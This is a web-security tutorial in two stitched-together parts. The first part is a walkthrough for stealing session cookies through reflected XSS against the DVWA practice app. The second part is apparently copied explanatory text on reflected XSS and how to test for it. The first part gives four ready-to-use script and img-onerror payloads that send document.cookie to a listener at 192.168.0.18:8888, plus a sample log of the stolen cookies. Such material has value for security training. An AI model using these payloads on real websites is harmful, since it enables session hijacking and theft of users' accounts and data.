# Steal Cookies with Reflected XSS

This is a basic Reflected XSS attack to steal cookies from a user of a vulnerable website. The attack string comes from Ch. 12, p. 436 of [The Web Application Hacker's Handbook, 2nd Ed.][3]

This was tested against the [Damn Vulnerable Web Application][5] (DVWA) v1.8. DVWA can be installed alone or as part of the excellent [OWASP Broken Web Applications Project][6] (BWA) v1.2.



### Assumptions:
1. You've already identified website (and field or parameter) that is vulnerable to Reflected XSS.
1. You're able to run shell commands on a Linux system that is reachable by the vulnerable web app. You'll probably need to run the Python script (mentioned below) as root or prepended with `sudo`.

## Run the Cookie Stealer Python Script

You'll need a place to capture the stolen cookies. [lnxg33k][1] has written an excellent Python script called [XSS-cookie-stealer.py][2]. Run it with Python 2.6 or higher. It is just an HTTP server which logs each inbound HTTP connection and all the cookies contained in that connection.

```shell
python XSS-cookie-stealer.py
```

The resulting output, at minimum, will be this:

```shell
Started http server

```

You're not there yet. Now you have to launch the actual attack. Below are a couple of choices.

## Inject the XSS Attack Code
Below are four versions of the same attack.

### 1. `alert()` Before Stealing the Cookie
Run this version of the attack code if you want to see the cookie in a JS `alert()` as confirmation that the injection is successfully exploiting the vulnerability on the target site. Note that the cookie will not upload to your Python listener until the victim closes the JS `alert()` dialog.

```javascript
<script>
alert(document.cookie);
var i=new Image;
i.src="http://192.168.0.18:8888/?"+document.cookie;
</script>
```

### 2. Silent One-Liner
This one is the same but no `alert()` and all on one line.

```js
<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>
```

### 3. `<img>` Tag Instead of `<script>` Tags
Don't use this one! It works but calls `onerror()` in a loop, filling up your stolen cookie log:
```html
<img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>
```

### 4. `<img>` Tag and Without the Infinite Loop
This one works and will only steal the cookie once. I adapted it from a posting on the old [kirupa.com][4] forum.
```html
<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
```

## Harvest the Stolen Cookies
If you successfully get inject your cookie-stealing XSS script into a vulnerable website, and the script is subsequently executed in a victim's browser, you'll see a cookie appear in the STDOUT of the shell running the Python script:

```shell
2017-02-09 10:05 PM - 192.168.0.254	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0
------------------------------------------------------------------------------------------------------------------
Cookie Name			Value
------------------------------------------------------------------------------------------------------------------
acopendivids			['swingset,jotto,phpbb2,redmine']
security			['low']
acgroupswithpersist			['nada']
PHPSESSID			['93l9ahf1120bkp79t5ehbkc0m4']
```


[1]: https://github.com/lnxg33k
[2]: https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
[3]: http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118026470.html
[4]: https://www.kirupa.com/forum/showthread.php?377664-onerror-within-the-img-tag
[5]: http://www.dvwa.co.uk/
[6]: http://www.owaspbwa.org/


##########
##
##
##
##


Reflected XSS

In this section, we'll explain reflected cross-site scripting, describe the impact of reflected XSS attacks, and spell out how to find reflected XSS vulnerabilities.
What is reflected cross-site scripting?

Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

Suppose a website has a search function which receives the user-supplied search term in a URL parameter:
https://insecure-website.com/search?term=gift

The application echoes the supplied search term in the response to this URL:
<p>You searched for: gift</p>

Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>

This URL results in the following response:
<p>You searched for: <script>/* Bad stuff here... */</script></p>

If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application.
LAB
APPRENTICE
Reflected XSS into HTML context with nothing encoded
Impact of reflected XSS attacks

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

    Perform any action within the application that the user can perform.
    View any information that the user is able to view.
    Modify any information that the user is able to modify.
    Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

There are various means by which an attacker might induce a victim user to make a request that they control, to deliver a reflected XSS attack. These include placing links on a website controlled by the attacker, or on another website that allows content to be generated, or by sending a link in an email, tweet or other message. The attack could be targeted directly against a known user, or could an indiscriminate attack against any users of the application:

The need for an external delivery mechanism for the attack means that the impact of reflected XSS is generally less severe than stored XSS, where a self-contained attack can be delivered within the vulnerable application itself.
Read more
Exploiting cross-site scripting vulnerabilities
Reflected XSS in different contexts

There are many different varieties of reflected cross-site scripting. The location of the reflected data within the application's response determines what type of payload is required to exploit it and might also affect the impact of the vulnerability.

In addition, if the application performs any validation or other processing on the submitted data before it is reflected, this will generally affect what kind of XSS payload is needed.
Read more
Cross-site scripting contexts
How to find and test for reflected XSS vulnerabilities

The vast majority of reflected cross-site scripting vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.

Testing for reflected XSS vulnerabilities manually involves the following steps:

    Test every entry point. Test separately every entry point for data within the application's HTTP requests. This includes parameters or other data within the URL query string and message body, and the URL file path. It also includes HTTP headers, although XSS-like behavior that can only be triggered via certain HTTP headers may not be exploitable in practice.
    Submit random alphanumeric values. For each entry point, submit a unique random value and determine whether the value is reflected in the response. The value should be designed to survive most input validation, so needs to be fairly short and contain only alphanumeric characters. But it needs to be long enough to make accidental matches within the response highly unlikely. A random alphanumeric value of around 8 characters is normally ideal. You can use Burp Intruder's number payloads [https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types#numbers] with randomly generated hex values to generate suitable random values. And you can use Burp Intruder's grep payloads option to automatically flag responses that contain the submitted value.
    Determine the reflection context. For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.
    Test a candidate payload. Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution if it is reflected unmodified within the response. The easiest way to test payloads is to send the request to Burp Repeater, modify the request to insert the candidate payload, issue the request, and then review the response to see if the payload worked. An efficient way to work is to leave the original random value in the request and place the candidate XSS payload before or after it. Then set the random value as the search term in Burp Repeater's response view. Burp will highlight each location where the search term appears, letting you quickly locate the reflection.
    Test alternative payloads. If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed. For more details, see cross-site scripting contexts
    Test the attack in a browser. Finally, if you succeed in finding a payload that appears to work within Burp Repeater, transfer the attack to a real browser (by pasting the URL into the address bar, or by modifying the request in Burp Proxy's intercept view, and see if the injected JavaScript is indeed executed. Often, it is best to execute some simple JavaScript like alert(document.domain) which will trigger a visible popup within the browser if the attack succeeds.

Common questions about reflected cross-site scripting

What is the difference between reflected XSS and stored XSS? Reflected XSS arises when an application takes some input from an HTTP request and embeds that input into the immediate response in an unsafe way. With stored XSS, the application instead stores the input and embeds it into a later response in an unsafe way.

What is the difference between reflected XSS and self-XSS? Self-XSS involves similar application behavior to regular reflected XSS, however it cannot be triggered in normal ways via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the victim themselves submits the XSS payload from their browser. Delivering a self-XSS attack normally involves socially engineering the victim to paste some attacker-supplied input into their browser. As such, it is normally considered to be a lame, low-impact issue.

